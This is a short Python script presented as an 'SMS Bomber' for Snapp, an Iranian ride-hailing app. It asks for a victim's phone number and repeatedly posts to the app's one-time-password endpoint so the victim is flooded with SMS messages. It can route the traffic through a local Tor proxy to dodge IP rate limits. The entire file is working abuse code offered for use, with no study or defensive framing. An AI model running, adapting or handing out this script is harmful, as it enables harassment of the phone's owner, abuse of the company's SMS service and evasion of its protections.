#!/usr/bin/python3
import requests
import os
import time

os.system('cls' if os.name=='nt' else 'clear')
print("SNAPP SMS Bomber By Sir.Liosion")
checkproxy = str(input("If you want to use TorNetwork Proxy On 9050 Write (( Y ))\r\nIf you Want to Use Proxyless Method Write (( N ))\r\n"))
snapH = {
    'Host': 'app.snapp.taxi', 
    'app-version': 'pwa', 
    'x-app-version': '5.0.1', 
    'x-app-name': 'passenger-pwa', 
    'Content-Type': 'application/json', 
    'Content-Length': '29'}
phone = input("Set Your Number Via +98==> ")
mount = int(input("\r\nNumber of Requestes==>"))
snapD = {"cellphone": phone}
print("SNAPP SMS Bomber By Sir.Liosion")


if checkproxy == "Y":
    proxy = {'socks5' : '127.0.0.1:9050'}
    for _ in range(0, mount):
        s = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        if "OK" in s.text:
            print("Sended")
            time.sleep(0.1)
        else:
            print("Change Your IP Please! Or Check Your TorNetwork Connected!")
else:
    pass


if checkproxy == "N":
    for _ in range(0, mount):
        s = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
        if "OK" in s.text:
            print("Sended")
            time.sleep(0.1)
        else:
            print("Change Your IP Please!")
else:
    print ("Wrong Choise!")


        
print("Happy Life :) By @LiosionQQ")